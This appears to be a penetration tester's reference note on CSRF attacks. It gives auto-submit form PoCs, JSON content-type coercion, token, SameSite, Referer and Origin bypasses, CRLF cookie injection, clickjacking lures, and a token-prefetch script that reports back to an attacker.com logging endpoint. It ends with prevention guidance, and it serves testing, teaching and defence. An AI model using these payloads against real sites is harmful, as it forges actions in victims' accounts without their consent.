# CSRF Attacks

#CSRF #XSRF #SameSite #WebAppAttacks #APIAttacks

## What is this?

Cross-Site Request Forgery forces an authenticated victim's browser to issue a **state-changing request** the user never intended. It abuses the app's trust in *ambient credentials* — cookies the browser attaches automatically to any request bound for that site, no matter which page triggered it.

CSRF is **write-only by default**. Same-origin policy stops the attacker's page from reading the response, so you fire the request blind and confirm impact out-of-band (the email actually changed, the role actually escalated). Chaining with [[CORS Misconfiguration]] or [[Cross-Site Scripting (XSS)]] is what turns it into a read primitive.

Pairs with [[Cross-Site Scripting (XSS)]], [[CORS Misconfiguration]], [[WebSockets]], [[OAuth-OIDC-SAML]], [[GraphQL]].

---

## Tools

| Tool | Purpose |
|---|---|
| `Burp Suite` | Engagement tools → Generate CSRF PoC; Repeater for token drop/swap tests; Intruder recursive grep to extract tokens |
| `curl` | Confirm the endpoint accepts the request without token / `Origin` / `Referer` |
| Browser DevTools | Inspect `Set-Cookie` attributes (`SameSite`, `Secure`, `HttpOnly`), watch blocked cross-site requests in the console |
| `python3 -m http.server` | Host the PoC page on the attacker origin |
| [ngrok](https://ngrok.com) / `socat` | Give the PoC an internet-reachable origin when the target can't reach your LAN |

---

## How CSRF Works

### The Three Preconditions

All three must hold. If any one fails, the attack doesn't land — check them in this order before burning time on payloads.

| # | Precondition | How to check |
|---|---|---|
| 1 | **A worthwhile action** — something that changes state (email, password, role, funds, API key) | Inventory every non-idempotent endpoint |
| 2 | **Cookie-based session handling** — the request is authenticated *solely* by cookies the browser sends on its own | If auth rides in an `Authorization: Bearer` header, CSRF is dead — JS must add that header, and cross-origin JS can't |
| 3 | **No unpredictable parameters** — the attacker can determine every value in the request | A per-request token you can't guess or fetch kills it; everything else in this note is about beating that |

### Request Flow

```text
Victim authenticates to target.com     → browser stores session cookie
Victim visits attacker.com             → attacker page auto-fires a request at target.com
Browser attaches target.com cookie     → because cookies are attached by destination, not by referrer
target.com executes as the victim      → attacker never sees the response
```

> [!warning] Precondition 2 is where most modern CSRF dies. SPAs and APIs that authenticate with a bearer token in a header are structurally immune. Confirm the session actually rides in a cookie before writing a PoC.

---

## Finding CSRF

```bash
# 1. Inventory state-changing endpoints from Burp's HTTP history
#    Filter to POST/PUT/PATCH/DELETE, plus any GET that mutates

# 2. Check what actually authenticates the request
#    Strip the Authorization header → still works? Cookie-authed → CSRF candidate
curl -s -X POST "https://target.com/account/email" \
  -b "session=<cookie>" \
  -d "email=test@example.com"

# 3. Read the cookie attributes — this decides which bypass section you need
curl -sI "https://target.com/login" | grep -i "set-cookie"
# SameSite=Strict → hardest; SameSite=Lax → GET-only vectors; None/absent → everything is on the table

# 4. Check what defense sits on the action endpoint
#    Drop the token → drop Origin → drop Referer → change the method. One at a time.
```

**Then test the defense that's actually present** — the sections below are ordered by which control you found.

---

## Building the PoC

### GET-Based

The cheapest vector, and the one that survives `SameSite=Lax` (see below). Works whenever a mutating action accepts `GET`.

```html
<!-- No user interaction at all — the image request fires on page load -->
<img src="https://target.com/account/email?email=attacker@evil.com">
```

### POST Auto-Submit Form

The workhorse. A cross-site form POST is a *simple request* — no preflight, no JS permission needed.

```html
<!-- Host on attacker.com; victim just has to open the page -->
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

```bash
# Serve it
python3 -m http.server 8080
# Victim visits http://<attacker-ip>:8080/csrf.html while logged into target.com
```

### JSON Endpoints (Content-Type Coercion)

A `fetch` with `Content-Type: application/json` triggers a CORS preflight, and the preflight will fail — so JSON APIs look CSRF-proof. They often aren't. If the server parses the body regardless of the declared content type, coerce the request into a *simple* one that skips preflight entirely.

Only three content types avoid preflight: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`.

```html
<!-- text/plain smuggling: the form body becomes name=value, so we make the whole JSON the name -->
<form action="https://target.com/api/account" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- Body on the wire: {"email":"attacker@evil.com","ignore":"="} -->
```

```bash
# Confirm the server tolerates a non-JSON content type before building the PoC
curl -s -X POST "https://target.com/api/account" \
  -H "Content-Type: text/plain" \
  -b "session=<cookie>" \
  --data '{"email":"attacker@evil.com"}'
# 200 / accepted → CSRF-able. 415 Unsupported Media Type → properly locked down.
```

> [!tip] Same trick applies to GraphQL — see [[#Chained Vectors]] and [[GraphQL]].

### Multipart / File Upload

```html
<!-- multipart is a simple request too — file upload endpoints are frequently unprotected -->
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar">
</form>
<!-- Can't set the file contents cross-origin, but can still trigger uploads/overwrites
     where the endpoint acts on the request itself (delete-and-replace semantics) -->
```

### Burp: Generate CSRF PoC

```text
Proxy → HTTP history → right-click the request
  → Engagement tools → Generate CSRF PoC
  → Options: "Include auto-submit script"
  → Copy HTML / Test in browser
```

Fast path for the form cases. It will not build the `text/plain` coercion for you — that one's by hand.

---

## Defense Mechanisms (What You're Bypassing)

| Defense | How it's meant to work | Characteristic failure |
|---|---|---|
| **Synchronizer token** | Unpredictable per-session/per-request token in the form, validated server-side against session state | Not tied to session; validated only when present; dropped on method change |
| **Double-submit cookie** | Token sent in both a cookie and a request parameter; server checks they match | Server compares the two values without validating either — inject a cookie and you control both sides |
| **`SameSite` cookie** | Browser withholds the cookie on cross-site requests | `Lax` still permits top-level GET navigation; `None` disables it entirely |
| **`Origin` / `Referer` check** | Server rejects requests from foreign origins | Naive substring matching; header suppressed and the check skipped when absent |
| **Custom header requirement** | e.g. `X-Requested-With: XMLHttpRequest` — cross-origin JS can't set it without preflight | Skipped on some routes; sometimes only enforced when the header is present |
| **Re-authentication** | Password/OTP required for the sensitive action | Only applied to some actions — check every one |

---

## Token Validation Bypasses

Test these in order against the action endpoint. Each is one Repeater request.

### 1. Method Swap (POST → GET)

Validation is frequently wired to the POST handler only.

```bash
# Original: POST with token. Try the same action as GET, token dropped.
curl -s -X GET "https://target.com/account/email?email=attacker@evil.com" -b "session=<cookie>"

# Also try HEAD, PUT, PATCH — frameworks route them differently
```

Bonus: a GET-accepting state change also defeats `SameSite=Lax`.

### 2. Token Removed Entirely

Three distinct tests — apps behave differently for each.

```bash
# a) Parameter removed completely  → often skips the validation branch outright
curl -s -X POST "https://target.com/account/email" -b "session=<cookie>" -d "email=attacker@evil.com"

# b) Parameter present but empty   → naive `if (token) validate()` passes
curl -s -X POST "https://target.com/account/email" -b "session=<cookie>" -d "email=attacker@evil.com&csrf="

# c) Correct length, wrong value   → catches length-only checks
curl -s -X POST "https://target.com/account/email" -b "session=<cookie>" -d "email=attacker@evil.com&csrf=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

### 3. Token Not Tied to Session

The token is validated as "a token this app issued" but never bound to *your* session.

```text
1. Log in as attacker → capture a valid CSRF token from your own session
2. Log in as victim (or use the victim's session cookie) → send the action with the ATTACKER's token
3. Accepted → the token is a global pool, not session-bound. Bake your token into the PoC — it works for every victim.
```

This is the single most useful token bypass in practice: the PoC becomes a static HTML file with a hardcoded token.

### 4. Token Tied to a Non-Session Cookie (Double-Submit)

The server checks `csrf_param == csrf_cookie` and validates neither against session state. If you can set a cookie on the target's domain, you control both halves.

```html
<!-- Attacker sets both the cookie value and the matching parameter -->
<form action="https://target.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="attacker-chosen-value">
</form>
<script>document.forms[0].submit();</script>
```

Cookie-injection routes to pair with it:

```bash
# a) Response-splitting / CRLF injection in any endpoint that reflects into a header
curl -s "https://target.com/setlang?lang=en%0d%0aSet-Cookie:%20csrf=attacker-chosen-value"

# b) XSS on ANY subdomain — cookies are set per-site, so sub.target.com can write for target.com
#    document.cookie = "csrf=attacker-chosen-value; domain=.target.com; path=/"

# c) An endpoint that reflects a parameter straight into Set-Cookie by design
```

> [!note] Cookies ignore the same-origin policy — they're scoped to the registrable domain. A foothold on *any* subdomain is enough to poison a double-submit token.

### 5. Static or Predictable Tokens

```bash
# Collect tokens across several fresh sessions and diff them
for i in $(seq 1 5); do
  curl -s "https://target.com/account" -b "session=<cookie>" | grep -oP 'name="csrf" value="\K[^"]+'
done
# Identical across sessions → static, hardcode it
# Sequential / timestamp-derived / short → predictable, model it
# base64 of the username or user ID → forge it per victim
```

### 6. Method Override

Frameworks that honour an override parameter let you dress a simple form POST up as a `PUT`/`DELETE` — reaching handlers that assume they're unreachable cross-origin. See the verb-tampering treatment in [[Web Attacks]].

```html
<form action="https://target.com/api/account" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
```

```bash
# Header form of the same trick
curl -s -X POST "https://target.com/api/account" \
  -H "X-HTTP-Method-Override: DELETE" -b "session=<cookie>"
```

---

## Token Prefetch Bypass

The case where the token is unpredictable, session-bound, and correctly validated — and it still doesn't save the app.

### Core Concept

Same-origin policy blocks *reading* a cross-origin response, not *sending* the request. If a CSRF token is embedded in a page reachable cross-origin, automation can fetch that page first, parse out the token, then attach it to the forged request.

### Attack Chain

1. Automated fetch (XHR/`fetch` from the attacker page, or a hidden iframe) pulls the page containing the fresh token
2. Parse the token out of the DOM/response body
3. Immediately fire the forged state-changing request with that token attached

### Why It Works

The token-issuing endpoint itself has to be exposed for this to work:

- CORS misconfigured to allow the attacker origin to read the token page
- No `X-Frame-Options` / CSP `frame-ancestors` to stop iframe embedding
- Cookies used to auth that fetch are `SameSite=None` or missing SameSite entirely

### PoC — CORS-Readable Token Page

```html
<!-- Host on attacker.com. Requires target.com to reflect the attacker Origin with ACAC: true -->
<script>
// 1. Prefetch the page that carries a fresh, session-bound token
fetch('https://target.com/account', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    // 2. Parse the token out of the returned DOM
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const token = doc.querySelector('input[name="csrf"]').value;
    //   also common: meta[name="csrf-token"] → .content, input[name="_token"] → .value

    // 3. Fire the real action with the freshly harvested token
    return fetch('https://target.com/account/email', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'email=attacker@evil.com&csrf=' + encodeURIComponent(token)
    });
  })
  .then(r => new Image().src = 'https://attacker.com/log?status=' + r.status);
</script>
```

### PoC — Framable Token Page

When CORS is locked down but the page can still be framed, read the token out of the iframe's DOM instead. Same-origin restrictions apply to the *frame's* document, so this variant needs the framed page to be same-origin with the attacker context — in practice it lands via a subdomain foothold or a permissive `document.domain` setup.

```html
<!-- No X-Frame-Options / no CSP frame-ancestors → embedding allowed -->
<iframe id="f" src="https://target.com/account" style="display:none"></iframe>
<script>
document.getElementById('f').onload = function () {
  const token = this.contentDocument.querySelector('input[name="csrf"]').value;
  // ...submit the forged request with `token`
};
</script>
```

### Testing Notes

- Even a well-implemented CSRF check on the *action* endpoint doesn't matter if the *token source* endpoint is itself fetchable cross-origin
- Check: does the token page require anything the attacker can't forge (custom header, strict CORS, framebusting)?
- Devs often lock down the action endpoint and forget the token endpoint needs the same scrutiny

```bash
# Is the token page readable from an arbitrary origin?
curl -si "https://target.com/account" \
  -H "Origin: https://evil.com" -b "session=<cookie>" \
  | grep -Ei "access-control-(allow-origin|allow-credentials)|x-frame-options|content-security-policy"
# ACAO reflects evil.com + ACAC: true  → prefetch via fetch()
# No XFO and no frame-ancestors        → prefetch via iframe
# Neither                              → token source is properly protected
```

### Report Angle

Frame this as **"token presence isn't sufficient, token source exposure defeats the control."** Good writeup material since it's a subtler finding than "no CSRF token" but the impact is the same. Point the remediation at the token-issuing endpoint — restrict CORS and add framing protections there, not just on the action route.

---

## SameSite Cookie Bypasses

`SameSite` is the control that actually stops most CSRF in modern browsers. Read `Set-Cookie` first, then pick the vector.

### `Lax` Still Allows Top-Level GET

`Lax` (the Chrome default) sends the cookie on **top-level navigations using a safe method**. So a state change that accepts `GET` remains fully exploitable.

```html
<!-- Top-level navigation, not a subresource — cookie IS attached under Lax -->
<script>window.location = 'https://target.com/account/email?email=attacker@evil.com';</script>
```

An `<img>` or `<iframe>` will *not* carry a `Lax` cookie — those are subresource requests. The navigation is the point.

### Chrome's Lax-by-Default Grace Window

Cookies set with no `SameSite` attribute are treated as `Lax` by Chrome, but with a **two-minute exemption**: within 120 seconds of being set, they're still sent on top-level cross-site **POST** requests.

```text
Exploitable when you can force a fresh session cookie right before the POST:
  1. Open a window to target.com's SSO/login-refresh endpoint → new Set-Cookie issued
  2. Within 2 minutes, fire the cross-site POST from the same page
Only applies to cookies with NO SameSite attribute — an explicit SameSite=Lax gets no grace period.
```

### `SameSite=None` — Everything Is Available

Required for any iframe- or XHR-driven variant, including the token prefetch above. Common on APIs and SSO flows. If you see `SameSite=None; Secure`, treat every vector in this note as live.

### Sibling Subdomain (Site vs Origin)

`SameSite` is **site**-scoped, not origin-scoped. A request from `sub.target.com` to `target.com` is same-site, so the cookie is attached even under `Strict`. Any XSS, subdomain takeover, or hosted-content foothold on a sibling subdomain neutralises `SameSite` completely.

```bash
# Enumerate subdomains, then look for anything that lets you run JS or host content
# A takeover on a forgotten subdomain is a full SameSite=Strict bypass
```

### `Strict` Bypass via Client-Side Redirect Gadget

If the app contains a redirect that's performed client-side (`window.location`, `<meta refresh>`) and lands on a same-site URL, the *final* request originates from the target's own origin — so `Strict` cookies ride along.

```text
attacker.com → target.com/redirect?next=/account/email?email=attacker@evil.com
The redirect hop is client-side and same-site → Strict cookie attached on the final request.
Server-side 302s do NOT work here — the browser still treats the follow-up as cross-site.
```

---

## Referer / Origin Validation Bypasses

### Suppressing the `Referer`

Many implementations validate the header *only when it's present*. Suppress it and the check is skipped.

```html
<!-- Page-wide suppression -->
<meta name="referrer" content="no-referrer">

<!-- Per-request suppression -->
<img src="https://target.com/account/email?email=attacker@evil.com" referrerpolicy="no-referrer">
```

```bash
# Confirm the "absent header" path is unguarded
curl -s -X POST "https://target.com/account/email" -b "session=<cookie>" -d "email=attacker@evil.com"
# (no Referer, no Origin sent at all)
```

### Naive Substring Matching

Validation written as `if (referer.contains("target.com"))` accepts anything that merely contains the string.

```bash
# Suffix trick — attacker registers a domain ending in the target's name
curl -s -X POST "https://target.com/account/email" \
  -H "Referer: https://eviltarget.com/" -b "session=<cookie>" -d "email=attacker@evil.com"

# Prefix / subdomain trick
curl -s -X POST "https://target.com/account/email" \
  -H "Referer: https://target.com.evil.com/" -b "session=<cookie>" -d "email=attacker@evil.com"

# Query-string trick — put the expected string somewhere it isn't the host
curl -s -X POST "https://target.com/account/email" \
  -H "Referer: https://evil.com/?x=https://target.com/" -b "session=<cookie>" -d "email=attacker@evil.com"
```

The query-string variant is reachable from a real browser — host the PoC at `https://evil.com/?x=https://target.com/` and the browser sends exactly that as the `Referer`.

### `Origin: null`

A sandboxed iframe, a `data:` URL, or a cross-site redirect all produce `Origin: null`. Allowlists that include `null` for legacy reasons fall over. Full treatment — every null-origin source, the `sandbox` token reference, and why `null` lands in allowlists — in [[Null Origin Attacks]].

```html
<iframe sandbox="allow-scripts allow-forms allow-top-navigation"
        src="data:text/html,<form action='https://target.com/account/email' method='POST'>
        <input name='email' value='attacker@evil.com'></form>
        <script>document.forms[0].submit()</script>"></iframe>
```

See the parallel treatment for read-side attacks in [[CORS Misconfiguration]].

---

## Custom Header Requirement Bypass

`X-Requested-With: XMLHttpRequest` (and friends) work because cross-origin JS can't set a custom header without a preflight the server will refuse. Two things go wrong:

- The check is applied to some routes and not others — enumerate every state-changing endpoint, not just the one you first found
- The check is `if (header_present) validate()` — omitting it entirely skips the branch

```bash
# Is the header actually required, or just validated when present?
curl -s -X POST "https://target.com/api/account" -b "session=<cookie>" -d "email=attacker@evil.com"
# Accepted without X-Requested-With → the "defense" is decorative
```

---

## Chained Vectors

Each of these has a fuller home elsewhere in the vault — cross-referenced rather than restated.

### XSS → CSRF

The complete bypass. Attacker JS runs in the victim's origin, so it can read the token from the DOM and send the request with correct cookies and correct origin. No CSRF control survives it. Full payloads in [[Cross-Site Scripting (XSS)#XSS → CSRF (Perform Actions as Victim)]].

### CORS → Token Read

A reflected-origin CORS misconfiguration with `Access-Control-Allow-Credentials: true` gives the attacker page read access — which is precisely what [[#Token Prefetch Bypass]] above builds on. Detection and PoCs in [[CORS Misconfiguration]].

### CSWSH (WebSocket)

Cross-Site WebSocket Hijacking is CSRF applied to the WebSocket handshake: the upgrade is an HTTP request, and if the server authenticates it with cookies and skips `Origin` validation, an attacker page can open an authenticated socket — and *read* from it, unlike classic CSRF. Fully covered in [[WebSockets#1. Cross-Site WebSocket Hijacking (CSWSH)]].

### GraphQL CSRF

A GraphQL endpoint that accepts `application/x-www-form-urlencoded` or mutations over `GET` is directly CSRF-able — no preflight, so a plain cross-site form fires a mutation. See [[GraphQL#CSRF via GraphQL]].

### OAuth `state` CSRF

A missing or fixed `state` parameter makes the OAuth callback forgeable, letting an attacker bind *their* authorization code to the victim's session — account linking takeover. See [[OAuth-OIDC-SAML#`state` CSRF]].

### Clickjacking-Assisted CSRF

When the action genuinely requires a click (or the token can't be forged but the button can be reached), frame the real page invisibly and lure the click onto it. The victim's own browser supplies the token, cookie, and origin.

```html
<!-- Requires no X-Frame-Options and no CSP frame-ancestors on the target -->
<style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 1000px; height: 800px; z-index: 2; }
  #lure  { position: absolute; top: 300px; left: 260px; z-index: 1; }
</style>
<iframe src="https://target.com/account/delete"></iframe>
<button id="lure">Claim your prize</button>
<!-- Align the lure under the real button — victim clicks the invisible iframe -->
```

```bash
# Check framability first
curl -sI "https://target.com/account/delete" | grep -iE "x-frame-options|content-security-policy"
```

### Login CSRF

Forging a *login* rather than an action: the attacker logs the victim into the **attacker's** account, and the victim's subsequent activity (payment details, search history, uploaded files) accrues to an account the attacker controls. Frequently dismissed as low severity — argue impact from what the victim then does while logged in as you.

### Open Redirect → CSRF

An open redirect on the target turns a cross-site request into a same-site one, which both defeats `Referer` checks and can carry `Strict` cookies (see the redirect gadget above). Related coverage in [[Server-Side Attacks]].

---

## Attack Matrix

| Defense found | What to try first | Impact if it lands |
|---|---|---|
| No token, no `SameSite` | Auto-submit POST form | Full state change as victim |
| Token present, not session-bound | Hardcode your own token in the PoC | Full state change, static PoC |
| Double-submit cookie | Cookie injection via subdomain XSS / CRLF | Full state change |
| Token correct + session-bound | Prefetch via CORS or iframe | Full state change; escalate to read if ACAC is set |
| `SameSite=Lax` | GET-accepting action via top-level navigation | Full state change |
| `SameSite=Lax` (no explicit attribute) | POST within the 2-minute grace window | Full state change |
| `SameSite=Strict` | Sibling-subdomain foothold or client-side redirect gadget | Full state change |
| `Referer` check | Suppress the header; substring tricks | Full state change |
| `Origin` allowlist incl. `null` | Sandboxed iframe / `data:` URL | Full state change |
| Custom header required | Omit it; hunt unprotected sibling routes | Full state change |
| Re-auth on the action | Look for a sibling route without it | Varies |

---

## Prevention (Know the Defenses)

| Control | What it stops | Residual gap |
|---|---|---|
| **Synchronizer token, session-bound** | All classic CSRF | Defeated by XSS; defeated by prefetch if the token page is cross-origin readable |
| **`SameSite=Strict` on session cookies** | Cross-site cookie attachment | Sibling subdomains are same-site; client-side redirect gadgets |
| **`SameSite=Lax` + no GET state changes** | Practical baseline for most apps | The 2-minute grace window when the attribute is left implicit |
| **`Origin` check, exact-match allowlist** | Foreign origins | Must reject the request when the header is *absent*, not skip the check |
| **Lock down the token-issuing endpoint** | Token prefetch | Needs strict CORS *and* `frame-ancestors` — the pair, not one |
| **Re-authentication on sensitive actions** | High-impact forgery specifically | Only covers the actions it's applied to |
| **`X-Frame-Options: DENY` / CSP `frame-ancestors 'none'`** | Clickjacking-assisted CSRF and iframe prefetch | No effect on form/fetch CSRF |

> [!tip] The pairing worth stressing in a report: a session-bound token **and** `SameSite`, with the token-issuing page held to the same origin restrictions as the action endpoint. Either control alone has a documented bypass class above.

---

## Related Topics

**Modules:**
- [[Cross-Site Scripting (XSS)]] - XSS defeats every CSRF control; also the cookie-injection route for double-submit
- [[CORS Misconfiguration]] - Makes the token page readable cross-origin, enabling prefetch
- [[WebSockets]] - CSWSH is CSRF against the WS handshake
- [[GraphQL]] - Content-type tolerance makes GraphQL mutations CSRF-able
- [[OAuth-OIDC-SAML]] - `state` parameter is CSRF protection for the OAuth callback
- [[Web Attacks]] - HTTP verb tampering and method override, reused here
- [[Server-Side Attacks]] - Open redirect chaining

**Tools:**
- [[Burpsuite]] - Generate CSRF PoC, token drop tests, recursive grep extraction

**External:**
- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger - SameSite Cookies](https://portswigger.net/web-security/csrf/bypassing-samesite-cookie-restrictions)
- [OWASP - CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

---

## Quick Reference

| Goal | Command / Payload |
|---|---|
| Read cookie attributes | `curl -sI https://target.com/login \| grep -i set-cookie` |
| Basic POST PoC | `<form action="https://target.com/x" method="POST"><input name="a" value="b"></form><script>document.forms[0].submit()</script>` |
| GET PoC (beats `Lax`) | `<script>window.location='https://target.com/x?a=b'</script>` |
| JSON without preflight | `<form enctype="text/plain"><input name='{"a":"b","z":"' value='"}'>` |
| Test token removal | Drop the param, then send it empty, then send a wrong-value-right-length token |
| Test session binding | Send the victim's request with the attacker's own valid token |
| Suppress `Referer` | `<meta name="referrer" content="no-referrer">` |
| `Referer` substring bypass | Host PoC at `https://evil.com/?x=https://target.com/` |
| `Origin: null` | `<iframe sandbox="allow-scripts allow-forms" src="data:text/html,...">` |
| Method override | `<input type="hidden" name="_method" value="DELETE">` |
| Is the token page prefetchable? | `curl -si https://target.com/account -H "Origin: https://evil.com" -b "session=<cookie>" \| grep -Ei "access-control-allow-\|x-frame-options\|frame-ancestors"` |
| Prefetch + fire | `fetch(page,{credentials:'include'}).then(r=>r.text()).then(h=>{t=new DOMParser().parseFromString(h,'text/html').querySelector('input[name=csrf]').value; /* POST with t */})` |
| Check framability | `curl -sI https://target.com/x \| grep -iE "x-frame-options\|content-security-policy"` |
| Burp PoC generator | Right-click request → Engagement tools → Generate CSRF PoC |

---

*Created: 2026-07-29*
*Updated: 2026-08-23*
*Model: claude-opus-4-8*
